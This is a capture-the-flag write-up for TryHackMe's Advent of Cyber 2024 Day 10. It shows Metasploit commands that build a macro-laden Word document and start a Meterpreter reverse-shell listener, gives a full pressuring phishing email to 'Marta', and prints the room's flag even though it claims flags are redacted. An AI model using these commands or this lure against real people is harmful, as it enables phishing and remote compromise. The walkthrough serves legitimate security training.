# Advent of Cyber 2024 - Day 10: He had a brain full of macros, and had shells in his soul.

{% embed url="https://tryhackme.com/room/adventofcyber2024" %}

## Overview & Investigation Walkthrough

1. What is the flag value inside theflag.txtfile that’s located on the Administrator’s desktop?

   First we must create our macro enabled Word document using `msfconsole`.

   ```cmd
   msfconsole

   search office word
   use 15
   show options

   set LHOST 10.11.101.240
   set LPORT 1337
   ```

   Notice that it automatically switching to the correct payload.

   ![Create Document](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Create_Document.png)

   Now we can send this document via email, but first we should setup a listener on the correct port. Notice that the payload needs to be set.

   ```cmd
   use multi/handler

   set LHOST 10.11.101.240
   set LPORT 1337
   set payload windows/meterpreter/reverse_tcp

   run
   ```

   ![Listener](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Listener.png)

   Now we can login to the mail server to send our phishing mail.

   ![Login](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Login.png)

   Here we must create a convincing email with the macro enabled file.

   ![Email](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Email.png)

   ```cmd
   Important Invoice of our Client!

   Hi Marta,

   I am sending you this email with a very important invoice from our customer. It appears this is several weeks overdue and hasn't been paid yet. We MUST pay within 14 hours or else we will face legal consequences!

   Kindly open the attached invoice.

   Kind regards,
   Bill from Accounting.
   ```

   I renamed the file to something more believeable and sent it.

   Looks like she responded:

   ![Response](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Response.png)

   After two minutes we get a reverse shell back. Lets find the flag!

   ![Flag](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Flag.png)

   ><details><summary>Click for answer</summary>THM{PHISHING_CHRISTMAS}</details>

2. If you enjoyed this task, feel free to check out thePhishingmodule.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the flag value inside theflag.txtfile that’s located on the Administrator’s desktop? | `flag{hidden}` |

> **Note:** Flags are redacted as `flag{hidden}` in accordance with responsible disclosure guidelines. The step-by-step commands above provide the verified reproduction path.
